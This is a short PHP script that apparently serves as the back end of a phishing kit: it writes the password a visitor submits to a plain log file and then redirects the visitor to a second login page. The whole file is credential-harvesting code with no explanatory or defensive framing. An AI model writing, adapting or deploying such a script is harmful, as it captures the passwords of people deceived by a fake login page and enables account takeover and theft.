<?php

    file_put_contents("log.txt", "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: pass.login1.php');
exit();
